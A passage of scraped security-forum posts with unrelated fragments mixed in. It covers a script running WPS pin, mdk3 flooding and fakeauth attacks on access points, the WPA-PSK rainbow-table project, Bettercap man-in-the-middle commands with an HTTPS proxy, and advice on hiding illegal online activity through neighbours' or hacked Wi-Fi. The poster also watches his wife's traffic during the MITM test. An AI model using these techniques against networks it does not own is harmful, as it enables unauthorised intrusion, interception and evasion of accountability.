You then do this a second time which will fail because the wireless device to put into monitoring mode doesn't exist anymore.\nNext you assign MON1, 2 and 3 to effectively the same device on the assumption that the name of the wireless interface is part of the name, which seems to be convention but I've never seen any guarantee of it.\nMind you, that's more a cleanliness issue and unless you're sporting multiple wireless devices chances are you'll never notice a problem.\nIt's good to know someone made an r3 as that means I'll need to give my version a different name.\n", "\nWith the old airmon-ng you could start multiple monitor interfaces for the same device. Since they're all on the exact same radio it didn't make much sense to do so, but maybe that's how they worked around not being able to open the device multiple times, an issue which has since been remedied.\nThe goal of the script is to have 3 concurrent programs doing their work over this one interface. The first is either bully or reaver to do a WPS pin attack, the second is mdk3 which tries to open so many client connections with the AP concurrently that it reboots, and finally aireplay-ng which is sending fakeauth reassociation requests. Again, everything is done via the same radio on a single channel, so you're limited to the amount of packets the device can spit into the ether and how the OS manages the simultaneous use of the device. It's worth noting that at least bully/reaver and mdk3 need to be receiving packets to work so if the device is only sending and never listening, this method will not work.\n", "\nWhat are the errors you're getting?\n", "\nAbout 60% down the script (well, the old one at least.

They want their radio to blare out signal like a teenager's stereo. Just because you get access to the CPU part of things by jumping through a hoop doesn't mean you get any closer to where you want to be.\nThe only good thing is that this rule is specific to radios operating in the 5GHz spectrum as it pertains to Wifi.

Even though in countries with higher speed limits have less accident. Places with no speed limits have less accidents. Why because they have higher for a pass on their driving tests. The driver has better problem solving skills and is probably smarter.\nNo, it's because those countries have changed the roads in such a way that it's safe for you to do so. You're not allowed to drive 200 mph through city limits there anymore than you are where ever you are. They often also have a points system whereby if you don't obey the traffic laws you quickly lose your driving license and as a result the chavs quickly learn to behave or get kept off the road.\nRemember, you're sharing the road with grandma who's driving to church at a mere 40 mph because she knows her response time isn't what it used to be.

So if you were to buy, say, concert and/or cinema tickets, or go to your banking website to pay for that VPN you use, you'd do so without being anonymous. The big difficulty lies in keeping your anonymous activities and your non-anonymous activities separate. This is very, very hard.\n", "\nhttps://forums.hak5.org/index.php?/topic/35133-3g-dongles-and-customer-names/page-2#entry260823\n", "\nRegarding TOR, for accessing the internet proper you basically get a secure line to the exit node, but beyond that anybody can see the traffic. So long as this traffic doesn't identify you in any way, shape or form, there's nothing to worry about. The smart thing to do is to have a dedicated machine somewhere in your house other than where you typically go about your computer-y things. This is a psychological barrier if you will - being in a different setting when you use the TOR box will help reinforce the idea that you shouldn't be doing your 'normal' computer-y things here. You can use personally identifying services from your TOR box, such as email, IM, twitter, even facebook. BUT you must be aware that no information provided here must refer to your real identity. You can't (re)tweet similar things (or worse, retweet your other identity's tweets), you can't like similar stuff (or worse, like your other identity's posts), etc. Basically, you need to focus as much as you can the online activity you do on your TOR box on the one thing you actually need the TOR box for. If you don't want the email account you access from your TOR box to end up being linked to the twitter account you use from your TOR box, use a different email address for registering (duh) and reboot your Tails distro before doing so, so you end up with a new TOR session for this activity. If you want to use these things simultaneously, acquire an additional machine to function as a TOR box, or run your batch of TOR boxes from a VM. Make sure the various VMs are rediculously easy to keep apart. Basically, try to have it that each VM on login goes straight into the application you want to use from that TOR box. If you receive a web link (via email, twitter or what have you) and you really want to click it, don't copy-paste the link to your general web browsing TOR vm but open it from within the TOR vm in which you received the link, otherwise it might happen that the two separate sessions can be linked and 'they' would be one step closer to identifying you.Moving on, when you talk to people about anonymity, they tend to leave out real life. Which is BAD. You must never ever admit to knowing anything you did from your TOR box. In fact, nobody can know you even have a TOR box and if you can make them believe you never use TOR, all the better.\nIf you performed some amazing hack, you can't tell anybody about it. It never ceases to amaze me the amount of stupid people that feel a need to brag about the crime they got away with and, in doing so, get caught. Like this idiot. Another example was a few years ago here in .nl where a large group of people were arrested for street racing. The police, when interviewing them, said they had the whole thing on tape and could identify everybody easily so it would look better if they just confessed. Only 1 guy held firm and claimed he was innocent. He was the only one to not go to court over this because it turned out the police interrogator lied - there was no tape of the street race but now there were quite a few taped confessions...If you do something illegal online and you feel you must do so using some nifty handle (something like, say, deface a website), you use that handle ONCE AND ONLY ONCE! The smart money is on not using a handle at all.If you do something illegal simply to impress others, MOVE THE FUCK OUT OF YOUR MOM'S BASEMENT AND GET A FUCKING LIFE! If the only way to impress your friends is to do something illegal, you need better friends.\nAnd finally, just because something is illegal doesn't mean it's wrong. There are plenty of lists to be found online of stupid laws, drafted in a time when pissing in a bucket was the pinnacle of technological achievement, that make some truly weird things illegal. For instance it's illegal to mispronounce the name Arkansas. Know what you're doing. Know why you're doing it. Understand the law and how it applies to you and be willing to accept the consequences of your actions.\n", "\nMy normal setup is, like digininja, Me -> Internet\nAs far as I can tell my online activities are by no means illegal, save for perhaps a torrent download here or there for which, here in .nl, not a single end-user has ever been arrested or served with legal documents. I mostly torrent music from which the artist isn't making a dime anyway, the legal access options are WAY limited for my particular taste in music and I go to a lot of concerts where I also regularly buy t-shirts and such. While technically illegal, morally I feel I'm being nicer than most. Should 'they' choose to come after me, I'm willing to make my case and accept any consequences.\nIf I did decide to knowingly do something explicitly nefarious that I fear might lead back to me, I'd use a separate machine and connect to the internet using the local mall's WIFI. I live in a pretty built-up area and the free WIFI providing mall is but a stones throw away. With a decent enough antenna it should be WELL within reach. Since there are residences literally built on top of the mall, good luck following its use back to me. Alternatively, I could hack any number of nearby APs and in many cases wouldn't even need to hack since, yes, WEP is still kinda common around here. Lots of elderly people who had a tech over to install things and are actively trying not to change anything after this. There's a music venue nearby that provides wifi to the local staff and that signal is accessible from my home using my phone. I used to volunteer there years ago so I know the password (but it's VERY guessable) plus I know many volunteers there gave out that password to the regular visitors. To make things more interesting, the municipal government pulled their funding so the place has been closed for the last year and a half but that wifi's still up and active. Lastly many businesses around here offer free wifi to its customers using passwords that rarely if ever change. When one does change you just go there for a meal and ask the waitress. You'll be set for a few more months at the minor inconvenience of eating out one time.\nSo yeah. In general if I want to get online pretty much invisibly I can do so from the comfort of my home using any of the myriad of wifi APs that either accidentally or explicitly invite complete strangers to use them, meaning that if someone managed to track me it would have to have been because I disclosed something identifying about myself rather than by someone managing to pinpoint my network route and linking that to a paying subscriber to vilify.\n", "\nStill leaves you with two problems.\n1.

Tools like Aircrack and coWPAtty took advantage of this weakness and provided a way to test keys against dictionaries.\n\nProblem is, it's a very slow process. Each passphrase is hashed 4096 times with SHA-1 and 256 bits of the output is the resulting hash. This is then compared to the hash generated in the initial key exchange. Alot of computing power is required for this. My dopey little P3/700 laptop only tests about 12 passphrases/second.\n\nTo complicate matters, the key hash can be different depending on the network it's implimented on. The SSID and the SSID length is seeded into the passphrase hash. This means that the passphrase of 'password' will be hashed differently on a network with the SSID of 'linksys' than it will on a network with the SSID of 'default'.\n\nFor the DC13 Wardriving contest there was one contest that was particularly infuriating. \"The Last Crusade\" had contestants attacking a series of access points to connect to a server behind it, each one's security was stronger than the previous. The last AP was WPA-PSK. 3 hours was slated for the contest, 1 hour was spend on the 4 previous APs'. We spent the last 2 hours running coWPAtty on 2 laptops and ended up failing to get the key. The last 2 hours were very boring.\n\nAfter the contest I began thinking that there had to be a better way. Eventually the planets aligned and I figured out a way. Problem was, how to get it accomplished\n\n\n\nWho\n\n\nBefore I get to far, This project was initiated by me but with a huge amount of help and support from many others. It's thier work that should be applauded. Ideas are cheap, work is not.\n\nRenderMan: Initiator, argent provocateur\nJoshua Wright: Original author of coWPAtty, added code to make this project a success. Coding god\nThorn: Moral support, sounding board, critic\nDragorn: Ass saving CPU wrangler and cool guy\nH1kari: FPGA god who gave us access to dedicated hardware for generating these tables\nTwitchy: CPU Wrangler and all around great guy\n\nOther peoples work contributed in-directly to this, but they deserve mention:\n\nBeetle: CPU wrangler for the Shmoo groups rainbow tables\nDan Moniz and Patrick Stach: Fellow Shmoo rainbow table conspirators\nPhilippe Oechslin: For a kick ass paper on the Time-Memory Trade-Off\n\n\n\nWHAT\n\n\nAt thier heart, rainbow tables are the embodiment of the Time-Memory trade-off. They are basically a giant version of your grade school multiplication tables. In those tables, given 2 numbers you can quickly lookup the result for that equasion without doing the more complicated math. The trick is that at some point, someone had to invest the time to do the complicated math in order to fill out the table for you to reap the benefit of a quick lookup. This is the heart of the Time-Memory trade off; It is often easier, cheaper, and more effecient to do the calculation once and store the output for later repetative use, than doing the math over each time.\n\nThe application of the Time-Memory trade-off is particularly useful in password cracking and cryptography. One of the barriers that cryptography uses is large keys. In order to test every possible key, the attacker faces a huge task that in some cases can take years.\n\nHowever given the exponential growth of both processing power and storage, it's concievable that an attacker could invest the time to pre-compute a lookup table for every possible key in advance of the actual attack, and commit that result to some sort of storage. All future attacks now only require a quick lookup in the table and are very close to instant. After investing the initial time to build the table, they no longer have to re-invest that time for subsiquient lookups.\n\nThis technique can also be refined through various sorting methods which go beyond the scope of the CoWF tables for WPA-PSK\n\nIn 2005 the Shmoo group released Rainbow tables for LANMAN hashes, effectivly breaking NT password security forever. This project led to the inspiration for the WPA-PSK tables\n\n\n\nHOW\n\n\nFor the WPA-PSK tables we knew that it would be impossible to create a lookup table for all possible keys. Because the seeding of the algorithm with the SSID and SSID length meant that we'd have to compute all possible keys against all possible SSID's, the storage space required for this was well beyond our capabilities to provide or even calculate.\n\nInstead we looked at the project and broke it down into a way to quickly check WPA-PSK networks against known english words and known passwords quickly, while still leaving the option open for brute forcing the rest of the keyspace. Selecting the most effecient dictionary and SSID's computed became the focus.\n\nSize was also a concern. As we wanted to be able to distribute the results, we did'nt want the results to be beyond the storage capacity of most users.\n\nThe first dictionary was a merged list of Websters dictionary, several lists of common passwords and the list of SSID's we were computing for. This list was sorted and all passphrases &lt; 8 or &gt; 64 were removed due to the minimum and maximum passphrase length in WPA-PSK. The grand total words was ~172,000\n\nThe SSID list was taken from the top 1000 SSID list on wigle.net. The SSID list came to represent about 52% of the Wigle database (at the time) of 5 million access points, which accounts for about 2.7 million known access points. We figured this would give us the widest possible coverage for public use (you could still compute your own hash tables for non-listed SSID's).\n\nThe resulting tables fit comfortably onto 2 DVD's\n\nJoshua Wright, author of coWPAtty graciously accepted my suggestion of integrating pre-hash tables into coWPAtty and coded up the tool (genpmk) for us.\n\nI spend the next month or so with a couple CPU's cranking away on the data, generating 1000 SSID's worth of hash tables from a 172,000 word dictionary. Towards the end I decided to test the hash files and get some metrics on how fast they computed. I setup a workstation to talk to a WPA-PSK AP with a passphrase that was known to be in the dictionary and captured the nessecary hash. I launched the attack with the coWPAtty 3.0 beta's and it was'nt finding the key. Eventually with Joshua Wrights help we dicovered where I'd screwed up. The password list had been saved in windows txt file format, leaving a hidden return character at the end of each line. This return character was being hashed in as part of the password giving me all wrong results!\n\nFortunatly, before commiting harikari for wasting a months CPU time, Dragorn offered access to a 27 node cluster. This cluster was able to compute the job up in about 3 days, and these files were working.\n\nThe result was a set of hash tables of about 8 gig total, comprising 1000 of the most common SSID's, computed for 172,000 dictionary words\n\nTests and a demonstration at Shmoocon showed that a p3/700 laptop without a hash table, tested keys at about 12 keys/sec. Including the hash table, the same laptop tested 18,000 keys/sec. 3 orders of magnitude faster!. What would have taken 4 hours to test previously, now was testable in 10 seconds.\n\nThis would be particularly useful for auditors wanting to confirm that WPA-PSK keys in use were not common words. Conversely this could also be used by attackers looking to find networks with easy keys, but as will be shown, that can be easily overcome.\n\nWe were not completely satisfied with this scenario and decided to go further and compute more words\n\nMark Burnett, noted password expert, donated his list of 400K actual passwords harvested through google giving us a highly targeted set of words that we know people have used. This was padded out with other obscure dictionaries (medical, etc) to an even 1 million words. Twitchy donated about 14 3 Ghz CPUs to do the work. After a month that involved him blowing several breakers and having to work topless to beat the heat, it turned out that I screwed up again and somehow the password list had control characters appended again!\n\nIt was at this time I was informed of H1kari's work in implementing the PBKDF2 hash function in hardware and showing massive gains in speed over a general purpose CPU. 1 card could compute 600 Keys/sec. He managed to hook us up with a box with 15 of these cards, effectivly doing over 9000 Keys/sec! What previously took Twitchy almost a month to compute, took H1kari 3 days. The end results barely fits on 9 DVD's and weighs in at about 33 Gb.\n\nAt this time we also had Josh Wright add code to support using coWPAtty to do the same attack on WPA2 which uses the same PBKDF2 key exchange, thus making the tables instantly capable of attacking WPA2 as well!\n\n\n\nAss covering\n\n\nThe fact that we found a way to speed up WPA-PSK cracking does not mean that it is broken. Far from it. The exploit used by coWPAtty and other similar tools is one of dumb passphrases. The minimum number of characters for a WPA-PSK passphrase is 8. The maximum is 63. Very few users actually use more than about 20 characters. As well, they also choose known words and phrases, likely to be in a dictionary. This allows us to leverage a human element in obtaining the key.\n\nTo get decent protection from WPA-PSK, you should use a very long, very random, alphanumeric string longer than 20 characters. To protect yourself further, particularly against the WPA-PSK hashtables, you should use a SSID not on the top 1000 list. This will force the attacker to compute thier own list, rather than use one of the CoWF tables.\n\nAll that said, you should be using WPA2 with a radius server to get more reliable protection.\n\n\n", "\n\n\n\n\n\n\n"], "shikatano\u00a0\u00a0": ["\nDoes your school make you authenticate when accessing the LAN?

I know because I've had them do it for me a number of times when our cell modems get stolen (cops show up at the thieves door within an hour).  The more urban you are, the easier it is for them because they have more + smaller \"cells\", so triangulating (using 3 overlapping towers, like a venn diagram with you in the middle) becomes simple.  The more rural you get, the harder it is because there are fewer, much much bigger cells.  So if you're out in the boonies, you're only within range of a single cell, that gives a 5, 10, 20 mile radius depending on topography of where you could be.  The other factor at play is the wireless module inside your air card - not the brand or carrier of the air card, the actual chip inside that does the connecting- some modules can triangulate on their own, whereas others cannot. \u00a0For example, I've noticed the qualcomm gobis can self triangulate very well whereas most sierra wirelesss cannot.

I am not trying to deny that, and truthfully that is not why I feel the way I do about it. The reason why I feel the way I do about it is because of the good old what if, which is what these laws were based on. What if someone uses my open AP to connect to the internet and hack something? That's why these laws were made. Now on the other side of the coin, what if I were to be driving by some smartasses house, my laptop has the wifi card on, and connects to their network, they see me as I pass by, get my tag #, find my mac address on their dhcp server, and then blame ME for hacking something that they did?

If you say yah but.. No. No buts. He contacts the authorities, cleans his computers prior to the investigation, maybe tweaks his mac tables a bit, if it collects timed data for connections, and OH LOOK! It's your mac address, connecting to his AP, that could match the time that the bank was hacked. If you say no, then how did he get your mac address? It's different for every person. \"I saw this guy sitting outside my house on his laptop, so I decided to find out where he was going.. etc.etc.etc\".\n\nIf you say well, that's one scenario, yah it's one.

It seems like a great tool and definitely has a lot of modularity but it still doesn't conquer HSTS.  I'll lay out the testing environment I used today and what I experienced.  If anyone else has better results please let me know how you accomplished them.Method 1: \u2022 Setup Backbox Linux with Bettercap on my home network containing multiple end user devices.\n \u2022 Access websites with MBP and Windows 10 desktop which are connected to the same network.Method 2: \u2022 Using Backbox Linux, hostapd, dnsmasq, iptables, and the Alfa AWUS036NEH, I set up an AP on my laptop to become an actual MITM. \u2022 Connected MBP to evil AP.The following commands were used during both methods:\n\n\nbettercap -X -L wlan0\n\n\nbettercap -X --proxy-https -I wlan0\n\nThe first command tells Bettercap to sniff all traffic in the subnet associated with wlan0 (in this case 192.168.1.0/24).  Bettercap immediately found a bunch of targets (including my NAS, Domain Controller, Printer, laptops, phones, etc) and began displaying a bunch of traffic.  I hopped on my MBP to see what would be captured when I browsed the internet but the network was brought to a halt.  So I switched to my desktop and found the same issue.  I pressed Ctrl+C in Bettercap and after a few seconds it stopped and my network came back up.I tested this out a few more times throughout the day and at various points the network was either down completely or dragging very slowly, while at other times it seemed to work just fine.  I did notice if I killed the connection to my VPN on Windows that I could get back out to the internet (didn't try on my MBP) but this only worked once or twice.  Most of the time I couldn't browse to any sites at all.Then I attempted to use Method 2 and the second command (with -L to sniff local traffic on my laptop) and it seemed when I connected my MBP to the evil AP it was able to get out to the internet just fine.  All of the traffic was logged with the protocol being used but since everything was HTTPS I couldn't view any of the data.The final command I used (this time using Method 1 again) enabled the HTTPS proxy server in Bettercap.  This is a really cool builtin feature but it didn't work out as I had hoped.  I hopped back on my MBP, and my desktop, and noticed the network was super slow again.  I browsed to www[.]facebook[.]com, https://www[.]facebook[.]com,and https://wwww[.]facebook[.]com.  The one with four w's seemed to work until I noticed on my MBP that Chrome had the \"Your Connection is Not Secure\" message.  I clicked the \"Advanced\" link hoping it would let me bypass the invalid certificate but it said due to HSTS I wasn't allowed to continue.  I tried to browse to a couple different sites, including these forums, on my desktop but nothing loaded as if I wasn't even connected to the internet.\nLike I mentioned before I was able to see src, dst, proto, and url so I was able to tell that my wife was spending all day on Facebook on her phone but I got nothing beyond that.  I probably missed a couple steps in this post but it's difficult for me to condense all of the setup, troubleshooting, and testing to a few lines.  If I wasn't clear enough about my testing I'll be glad to answer any questions you may have.
